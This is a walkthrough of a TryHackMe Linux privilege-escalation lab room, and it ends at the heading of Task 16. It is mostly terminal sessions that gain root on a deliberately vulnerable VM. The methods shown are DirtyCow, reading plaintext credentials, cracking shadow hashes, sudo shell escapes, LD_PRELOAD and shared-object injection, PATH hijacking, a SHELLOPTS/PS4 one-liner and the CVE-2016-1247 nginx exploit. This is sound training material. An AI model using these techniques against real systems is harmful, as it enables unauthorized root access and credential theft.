---
title: Linux PrivEsc Arena
author: CYB3RM3
name: CYB3RM3 | Linux PrivEsc Arena
date: 2022-04-18 15:53:17 +0100
categories: [TryHackMe, RedTeam]
tags: [Red Team, Privesc, Linux]
---

Students will learn how to escalate privileges using a very vulnerable Linux VM. SSH is open. Your credentials are TCM:Hacker123

THM Room [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)


## TASK 1 : [Optional] Connecting to the TryHackMe network
### Read the above. 
No Answer

## TASK 2 : Deploy the vulnerable machine
### Deploy the machine and log into the user account via SSH (or use the browser-based terminal). 
No Answer

## TASK 3 : Privilege Escalation - Kernel Exploits
###  What PID should System always be? 
First, checking the machine is vulnerable :

```console
TCM@debian:~/tools/linux-exploit-suggester$ ls
linux-exploit-suggester.sh
TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh 

Kernel version: 2.6.32
Architecture: x86_64
Distribution: debian
Package list: from current OS

Possible Exploits:

[+] [CVE-2010-3301] ptrace_kmod2

   Details: https://www.exploit-db.com/exploits/15023/
   Tags: debian=6,ubuntu=10.04|10.10
   Download URL: https://www.exploit-db.com/download/15023

[+] [CVE-2010-1146] reiserfs

   Details: https://www.exploit-db.com/exploits/12130/
   Tags: ubuntu=9.10
   Download URL: https://www.exploit-db.com/download/12130

[+] [CVE-2010-2959] can_bcm

   Details: https://www.exploit-db.com/exploits/14814/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/14814

[+] [CVE-2010-3904] rds

   Details: http://www.securityfocus.com/archive/1/514379
   Tags: debian=6,ubuntu=10.10|10.04|9.10,fedora=16
   Download URL: https://www.exploit-db.com/download/15285

[+] [CVE-2010-3848,CVE-2010-3850,CVE-2010-4073] half_nelson

   Details: https://www.exploit-db.com/exploits/17787/
   Tags: ubuntu=10.04|9.10
   Download URL: https://www.exploit-db.com/download/17787

[+] [CVE-2010-4347] american-sign-language

   Details: https://www.exploit-db.com/exploits/15774/
   Download URL: https://www.exploit-db.com/download/15774

[+] [CVE-2010-3437] pktcdvd

   Details: https://www.exploit-db.com/exploits/15150/
   Tags: ubuntu=10.04
   Download URL: https://www.exploit-db.com/download/15150

[+] [CVE-2010-3081] video4linux

   Details: https://www.exploit-db.com/exploits/15024/
   Tags: RHEL=5
   Download URL: https://www.exploit-db.com/download/15024

[+] [CVE-2012-0056,CVE-2010-3849,CVE-2010-3850] full-nelson

   Details: http://vulnfactory.org/exploits/full-nelson.c
   Tags: ubuntu=9.10|10.04|10.10,ubuntu=10.04.1
   Download URL: http://vulnfactory.org/exploits/full-nelson.c

[+] [CVE-2013-2094] perf_swevent

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6,ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/26131

[+] [CVE-2013-2094] perf_swevent 2

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: ubuntu=12.04
   Download URL: https://cyseclabs.com/exploits/vnik_v1.c

[+] [CVE-2013-0268] msr

   Details: https://www.exploit-db.com/exploits/27297/
   Download URL: https://www.exploit-db.com/download/27297

[+] [CVE-2013-2094] semtex

   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
   Tags: RHEL=6
   Download URL: https://www.exploit-db.com/download/25444

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: RHEL=5|6|7,debian=7|8,ubuntu=16.10|16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40616

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Tags: ubuntu=16.04
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2009-1185] udev

   Details: https://www.exploit-db.com/exploits/8572/
   Tags: ubuntu=8.10|9.04
   Download URL: https://www.exploit-db.com/download/8572
   Comments: Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed 

[+] [CVE-2009-1185] udev 2

   Details: https://www.exploit-db.com/exploits/8478/
   Download URL: https://www.exploit-db.com/download/8478
   Comments: SSH access to non privileged user is needed. Version<1.4.1 vulnerable but distros use own versioning scheme. Manual verification needed

[+] [CVE-2010-0832] PAM MOTD

   Details: https://www.exploit-db.com/exploits/14339/
   Tags: ubuntu=9.10|10.04
   Download URL: https://www.exploit-db.com/download/14339
   Comments: SSH access to non privileged user is needed

[+] [CVE-2016-1247] nginxed-root.sh

   Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
   Tags: debian=8,ubuntu=14.04|16.04|16.10
   Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
   Comments: Rooting depends on cron.daily (up to 24h of dealy). Affected: deb8: <1.6.2; 14.04: <1.4.6; 16.04: 1.10.0

```
{: .nolineno }

Then compiling the dirtycow exploit :

```console
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
```
{: .nolineno }

And finally, launched the exploit to become root :

```console
TCM@debian:~$ ls
c0w  myvpn.ovpn  tools
TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~$ ./c0w 
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 486ec000

madvise 0

ptrace 0

TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~$ passwd
root@debian:/home/user# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:/home/user#
```
{: .nolineno }

Answer : 4

## TASK 4 : Privilege Escalation - Stored Passwords (Config Files)
### What password did you find? 
User has one .ovpn file with the path to the auth.txt file :

```console
TCM@debian:~$ cat /home/user/myvpn.ovpn 
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

TCM@debian:~$ cat /etc/openvpn/auth.txt
user
password321
```
{: .nolineno }

Answer : password321

### What user's credentials were exposed in the OpenVPN auth file?

Answer : user

A second config file is on the machine with clear text credentials :

```console
TCM@debian:~$ cat /home/user/.irssi/config | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
TCM@debian:~$ 
```
{: .nolineno }

## TASK 5 : Privilege Escalation - Stored Passwords (History)
### What was TCM trying to log into? 
Looked into the "bash_history" file :

```console
TCM@debian:~$ ls -la
total 48
drwxr-xr-x  5 TCM  user 4096 Jun 18  2020 .
drwxr-xr-x  3 root root 4096 May 15  2017 ..
-rw-------  1 TCM  user  801 Jun 18  2020 .bash_history
-rw-r--r--  1 TCM  user  220 May 12  2017 .bash_logout
-rw-r--r--  1 TCM  user 3235 May 14  2017 .bashrc
drwx------  2 TCM  user 4096 Jun 18  2020 .gnupg
drwxr-xr-x  2 TCM  user 4096 May 13  2017 .irssi
-rw-------  1 TCM  user  137 May 15  2017 .lesshst
-rw-r--r--  1 TCM  user  212 May 15  2017 myvpn.ovpn
-rw-------  1 TCM  user   11 Jun 18  2020 .nano_history
-rw-r--r--  1 TCM  user  725 May 13  2017 .profile
drwxr-xr-x 10 TCM  user 4096 Jun 18  2020 tools
TCM@debian:~$ cat ~/.bash_history | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
TCM@debian:~$ 
```
{: .nolineno }

Answer : smss.exe

### Who was TCM trying to log in as?

Answer : root

### Naughty naughty.  What was the password discovered?

Answer : password123

## TASK 6 : Privilege Escalation - Weak File Permissions
### What were the file permissions on the /etc/shadow file? 

```console
TCM@debian:~$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
```
{: .nolineno }

The file is readable by our user so we can extract the /Etc/passwd and /etc/shadow to our Kali machine to unshadow these and cracking  the hash :

```console
unshadow passwd.txt shadow.txt > unshadowed.txt
```
{: .nolineno }

The the result of hashcat :

```console
root@ip-10-10-9-130:~/Desktop# hashcat -m 1800 unshadowed.txt rockyou.txt -O
[...]
Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 5 secs

$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => b
[...]
```
{: .nolineno }

Answer : -rw-rw-r--

## TASK 7 : Privilege Escalation - SSH Keys
### What's the full file path of the sensitive file you discovered? 
Searching for SSH keys on the system :

```console
TCM@debian:~$ find / -name authorized_keys 2> /dev/null
TCM@debian:~$ find / -name id_rsa 2> /dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$ cat /backups/supersecretkeys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
[...]
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
```
{: .nolineno }

Copied this to the Kali machine and trying to connect :

```console
root@ip-10-10-9-130:~/Desktop# chmod 400 id_rsa 
root@ip-10-10-9-130:~/Desktop# ssh -i id_rsa root@10.10.3.74
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 17 23:31:40 2020 from 192.168.4.51
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# 
```
{: .nolineno }

Answer : /backups/supersecretkeys/id_rsa

## TASK 8 : Privilege Escalation - Sudo (Shell Escaping)
### Click 'Completed' once you have successfully elevated the machine 
Many ways here :

```console
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo find /bin -name nano -exec /bin/sh \;
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
TCM@debian:~$ sudo awk 'BEGIN{system("/bin/sh")}'
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
TCM@debian:~$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap -script=shell.nse

Starting Nmap 5.00 ( http://nmap.org ) at 2022-04-18 08:16 EDT
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1# exit
exit
NSE: failed to initialize the script engine:
/usr/share/nmap/nse_main.lua:228: ./shell.nse is missing required field: 'categories'
stack traceback:
	[C]: in function 'error'
	/usr/share/nmap/nse_main.lua:228: in function 'new'
	/usr/share/nmap/nse_main.lua:392: in function 'get_chosen_scripts'
	/usr/share/nmap/nse_main.lua:594: in main chunk
	[C]: ?

QUITTING!
TCM@debian:~$ sudo vim -c '!sh'

sh-4.1# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.1#
```

No Answer

## TASK 9 : Privilege Escalation - Sudo (Abusing Intended Functionality)
###  Click 'Completed' once you have successfully elevated the machine  

```console
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ sudo apache2 -f /etc/shadow
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration


```
{: .nolineno }

Copied the root hash the write it in a file :

```console
echo "root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" > hash.txt
```
{: .nolineno }

Finally, crack with John :

```console
root@ip-10-10-9-130:~/Desktop# john --wordlist=/usr/share/wordlists/rockyou.txt hash.Txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)
1g 0:00:00:00 DONE (2022-04-18 13:27) 1.408g/s 2163p/s 2163c/s 2163C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
{: .nolineno }

No Answer.

## TASK 10 : Privilege Escalation - Sudo (LD_PRELOAD)
### What is the non-existent parent process for winlogon.exe? 
When LD_PRELOAD environment variable is set, we can abuse it :

```console
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ ls
myvpn.ovpn  shell.nse  tools
TCM@debian:~$ nano x.c
TCM@debian:~$ cat x.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
TCM@debian:~$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
TCM@debian:~$ ls /tmp
backup.tar.gz  useless  x.so
TCM@debian:~$ sudo LD_PRELOAD=/tmp/x.so apache2
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

No Answer.

## TASK 11 : Privilege Escalation - SUID (Shared Object Injection)
### Click 'Completed' once you have successfully elevated the machine 

```console
TCM@debian:~/.config$  find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158723  912 -rwsr-sr-x   1 root     staff      926536 Apr 18 08:44 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs

TCM@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY) = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
TCM@debian:~$ mkdir /home/user/.config
TCM@debian:~$ cd /home/user/.config/
TCM@debian:~/.config$ nano libcalc.c
TCM@debian:~/.config$ gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
TCM@debian:~/.config$ ls
libcalc.c libcalc.so
TCM@debian:~/.config$ /usr/local/bin/suid-so 
Calculating something, please wait...
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```
{: .nolineno }

No Answer.


## TASK 12 : Privilege Escalation - SUID (Symlinks)
### What CVE is being exploited in this task? 

Quick googling info from the nginx version vulnerable :

![CVE-2016-1247](/images/thm/linuxprivescarena/linuxprivescarena_1.png)
_CVE-2016-1247_

Answer : CVE-2016-1247

### What binary is SUID enabled and assists in the attack?

What's our nginx version ? is it vulnerable  ? 

```console
www-data@debian:~$ dpkg -l | grep nginx
ii  nginx-common                        1.6.2-5+deb8u2~bpo70+1       small, powerful, scalable web/proxy server - common files
ii  nginx-full                          1.6.2-5+deb8u2~bpo70+1       nginx web/proxy server (standard version)
www-data@debian:~$ 
```
{: .nolineno }

It can be exploited.
Terminal 1 :

```console
www-data@debian:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@debian:~$ /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
 _______________________________
< Is your server (N)jinxed ? ;o >
 -------------------------------
           \ 
            \          __---__
                    _-       /--______
               __--( /     \ )XXXXXXXXXXX\v.  
             .-XXX(   O   O  )XXXXXXXXXXXXXXX- 
            /XXX(       U     )        XXXXXXX\ 
          /XXXXX(              )--_  XXXXXXXXXXX\ 
         /XXXXX/ (      O     )   XXXXXX   \XXXXX\ 
         XXXXX/   /            XXXXXX   \__ \XXXXX
         XXXXXX__/          XXXXXX         \__---->
 ---___  XXX__/          XXXXXX      \__         /
   \-  --__/   ___/\  XXXXXX            /  ___--/=
    \-\    ___/    XXXXXX              '--- XXXXXX
       \-\/XXX\ XXXXXX                      /XXXXX
         \XXXXXXXXX   \                    /XXXXX/
          \XXXXXX      >                 _/XXXXX/
            \XXXXX--__/              __-- XXXX/
             -XXXXXXXX---------------  XXXXXX-
                \XXXXXXXXXXXXXXXXXXXXXXXXXX/
                  ""VXXXXXXXXXXXXXXXXXXV""
 
Nginx (Debian-based distros) - Root Privilege Escalation PoC Exploit (CVE-2016-1247) 
nginxed-root.sh (ver. 1.0)

Discovered and coded by: 

Dawid Golunski 
https://legalhackers.com 

[+] Starting the exploit as: 
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Compiling the privesc shared library (/tmp/privesclib.c)

[+] Backdoor/low-priv shell installed at: 
-rwxr-xr-x 1 www-data www-data 926536 Apr 18 08:53 /tmp/nginxrootsh

[+] The server appears to be (N)jinxed (writable logdir) ! :) Symlink created at: 
lrwxrwxrwx 1 www-data www-data 18 Apr 18 08:53 /var/log/nginx/error.log -> /etc/ld.so.preload

[+] Waiting for Nginx service to be restarted (-USR1) by logrotate called from cron.daily at 6:25am...
[+] Nginx restarted. The /etc/ld.so.preload file got created with web server privileges: 
-rw-r--r-- 1 www-data root 19 Apr 18 08:53 /etc/ld.so.preload

[+] Adding /tmp/privesclib.so shared lib to /etc/ld.so.preload

[+] The /etc/ld.so.preload file now contains: 
/tmp/privesclib.so

[+] Escalating privileges via the /usr/bin/sudo SUID binary to get root!
-rwsrwxrwx 1 root root 926536 Apr 18 08:53 /tmp/nginxrootsh

[+] Rootshell got assigned root SUID perms at: 
-rwsrwxrwx 1 root root 926536 Apr 18 08:53 /tmp/nginxrootsh

The server is (N)jinxed ! ;) Got root via Nginx!

[+] Spawning the rootshell /tmp/nginxrootsh now! 

nginxrootsh-4.1# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
nginxrootsh-4.1#
```
{: .nolineno }

Termial 2 : 

```console
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:~# invoke-rc.d nginx rotate >/dev/null 2>&1
root@debian:~# 
```
{: .nolineno }

Answer : sudo

## TASK 13 : Privilege Escalation - SUID (Environment Variables #1)
### What is the last line of the "strings /usr/local/bin/suid-env" output? 
Detection :

```console
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null
809081   40 -rwsr-xr-x   1 root     root        37552 Feb 15  2011 /usr/bin/chsh
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudo
810173   36 -rwsr-xr-x   1 root     root        32808 Feb 15  2011 /usr/bin/newgrp
812578  172 -rwsr-xr-x   2 root     root       168136 Jan  5  2016 /usr/bin/sudoedit
809080   44 -rwsr-xr-x   1 root     root        43280 Jun 18  2020 /usr/bin/passwd
809078   64 -rwsr-xr-x   1 root     root        60208 Feb 15  2011 /usr/bin/gpasswd
809077   40 -rwsr-xr-x   1 root     root        39856 Feb 15  2011 /usr/bin/chfn
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
815723  948 -rwsr-xr-x   1 root     root       963691 May 13  2017 /usr/sbin/exim-4.84-3
832517    8 -rwsr-xr-x   1 root     root         6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
832743  212 -rwsr-xr-x   1 root     root       212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
812623   12 -rwsr-xr-x   1 root     root        10592 Feb 15  2016 /usr/lib/pt_chown
473324   36 -rwsr-xr-x   1 root     root        36640 Oct 14  2010 /bin/ping6
473323   36 -rwsr-xr-x   1 root     root        34248 Oct 14  2010 /bin/ping
473292   84 -rwsr-xr-x   1 root     root        78616 Jan 25  2011 /bin/mount
473312   36 -rwsr-xr-x   1 root     root        34024 Feb 15  2011 /bin/su
473290   60 -rwsr-xr-x   1 root     root        53648 Jan 25  2011 /bin/umount
1158725  912 -rwsrwxrwx   1 root     root       926536 Apr 18 08:53 /tmp/nginxrootsh
1158723  912 -rwsr-sr-x   1 root     staff      926536 Apr 18 08:44 /tmp/bash
465223  100 -rwsr-xr-x   1 root     root        94992 Dec 13  2014 /sbin/mount.nfs
TCM@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
{: .nolineno }

Exploitation : 

```console
TCM@debian:~$ echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
TCM@debian:~$ ls /tmp/
backup.tar.gz  bash  nginxrootsh  service.c  useless  x.so
TCM@debian:~$ gcc /tmp/service.c -o /tmp/service
TCM@debian:~$ ls /tmp
backup.tar.gz  bash  nginxrootsh  service  service.c  useless  x.so
TCM@debian:~$ export PATH=/tmp:$PATH
TCM@debian:~$ /usr/local/bin/suid-env
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```
{: .nolineno }

Answer : service apache2 start

## TASK 14 : Privilege Escalation - SUID (Environment Variables #2)
### What is the last line of the "strings /usr/local/bin/suid-env2" output? 

```console
TCM@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```
{: .nolineno }

We can exploit this with the single command : 

```console
TCM@debian:~$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
cp: cannot create regular file `/tmp/bash': Permission denied
/usr/local/bin/suid-env2
/usr/sbin/service apache2 start
basename /usr/sbin/service
VERSION='service ver. 0.91-ubuntu1'
basename /usr/sbin/service
USAGE='Usage: service < option > | --status-all | [ service_name [ command | --full-restart ] ]'
SERVICE=
ACTION=
SERVICEDIR=/etc/init.d
OPTIONS=
'[' 2 -eq 0 ']'
cd /
'[' 2 -gt 0 ']'
case "${1}" in
'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
'[' 2 -eq 2 -a start = --full-restart ']'
'[' -z '' ']'
SERVICE=apache2
shift
'[' 1 -gt 0 ']'
case "${1}" in
'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
'[' 1 -eq 2 -a '' = --full-restart ']'
'[' -z apache2 ']'
'[' -z '' ']'
ACTION=start
shift
'[' 0 -gt 0 ']'
'[' -r /etc/init/apache2.conf ']'
'[' -x /etc/init.d/apache2 ']'
exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
Starting web server: apache2httpd (pid 1686) already running
.
cp: cannot create regular file `/tmp/bash': Permission denied
set +x
bash-4.1# id
uid=1000(TCM) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1# 
```
{: .nolineno }

Answer : /usr/sbin/service apache2 start

## TASK 15 : Privilege Escalation - Capabilities
### Click 'Completed' once you have successfully elevated the machine 
We have the capability "cap_setuid" set on the value "/usr/bin/python2.6" :

```console
TCM@debian:~$ getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep
TCM@debian:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@debian:~# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```
{: .nolineno }

No Answer

## TASK 16 : Privilege Escalation - Cron (Path)
### Click 'Completed' once you have successfully elevated the machine 

